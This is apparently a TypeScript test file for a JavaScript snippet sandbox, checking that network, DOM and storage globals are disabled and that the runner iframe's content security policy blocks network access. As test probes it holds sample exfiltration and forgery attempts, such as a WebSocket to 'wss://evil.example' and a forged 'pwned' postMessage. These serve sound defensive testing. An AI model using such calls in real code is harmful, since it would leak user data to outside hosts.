import { describe, it } from 'mocha';
import { expect } from 'chai';
import {
  buildSandboxPrelude,
  buildMainThreadPrelude,
  neuteredNames,
  mainThreadExtraNames,
} from '@/components/thread/sandbox-prelude';
import { GET as getCodeSandbox } from '@/app/code-sandbox/route';
import { CODE_SANDBOX_CSP } from '@/lib/config/code-sandbox';

const mockConsole = {
  log: () => {},
  warn: () => {},
  error: () => {},
  info: () => {},
  debug: () => {},
};

/** Run a probe inside the exact construct the runner uses. */
function probeInSandbox(prelude: string, probe: string): unknown {
  const fn = new Function('console', `${prelude}\n${probe}`);
  return fn(mockConsole);
}

describe('snippet sandbox prelude', () => {
  it('is strict mode (top-level `this` is undefined)', () => {
    expect(probeInSandbox(buildSandboxPrelude(), 'return this;')).to.equal(undefined);
  });

  it('neuters network, comms, and global escape hatches', () => {
    const names = neuteredNames();
    const result = probeInSandbox(
      buildSandboxPrelude(),
      `return [${names.map((n) => `typeof ${n}`).join(', ')}];`
    ) as string[];
    expect(result).to.have.length(names.length);
    for (const t of result) expect(t).to.equal('undefined');
  });

  it('neuters DOM/storage on the main-thread fallback path', () => {
    const names = mainThreadExtraNames();
    const result = probeInSandbox(
      buildMainThreadPrelude(),
      `return [${names.map((n) => `typeof ${n}`).join(', ')}];`
    ) as string[];
    for (const t of result) expect(t).to.equal('undefined');
  });

  it('makes completion forgery throw instead of posting', () => {
    expect(() =>
      probeInSandbox(buildSandboxPrelude(), 'postMessage({output:"pwned",error:null});')
    ).to.throw(TypeError);
  });

  it('makes exfiltration attempts throw', () => {
    expect(() => probeInSandbox(buildSandboxPrelude(), 'return fetch("/api/bounties");')).to.throw(
      TypeError
    );
    expect(() =>
      probeInSandbox(buildSandboxPrelude(), 'return new WebSocket("wss://evil.example");')
    ).to.throw(TypeError);
  });

  it('makes nested constructors unable to escape scope', () => {
    expect(() =>
      probeInSandbox(buildSandboxPrelude(), 'return Function("x", "return x");')
    ).to.throw(TypeError);
  });

  it('still allows benign computation and console', () => {
    const seen: unknown[] = [];
    const logs = { ...mockConsole, log: (s: unknown) => seen.push(s) };
    const fn = new Function(
      'console',
      `${buildSandboxPrelude()}\nconsole.log(6 * 7); return [1,2,3].map(x => x * 2).join(",");`
    );
    expect(fn(logs)).to.equal('2,4,6');
    expect(seen).to.deep.equal([42]);
  });

  it('fails closed when a snippet redeclares a neutered name', () => {
    // Duplicate `const` is a SyntaxError at construction — the runner reports
    // it as a snippet error instead of running partially-neutered code.
    expect(() => probeInSandbox(buildSandboxPrelude(), 'const fetch = 1; return fetch;')).to.throw(
      SyntaxError
    );
  });
});

describe('code-runner iframe document', () => {
  it('is served with an opaque-origin sandbox policy that blocks network access', async () => {
    const response = getCodeSandbox();
    const html = await response.text();

    expect(response.headers.get('Content-Security-Policy')).to.equal(CODE_SANDBOX_CSP);
    expect(CODE_SANDBOX_CSP).to.contain("connect-src 'none'");
    expect(CODE_SANDBOX_CSP).to.contain("'unsafe-eval'");
    expect(CODE_SANDBOX_CSP).to.contain("frame-ancestors 'self'");
    expect(html).to.contain("event.source !== window.parent");
    expect(html).to.contain("data.type !== 'run'");
    expect(html).to.contain('new Function');
  });
});
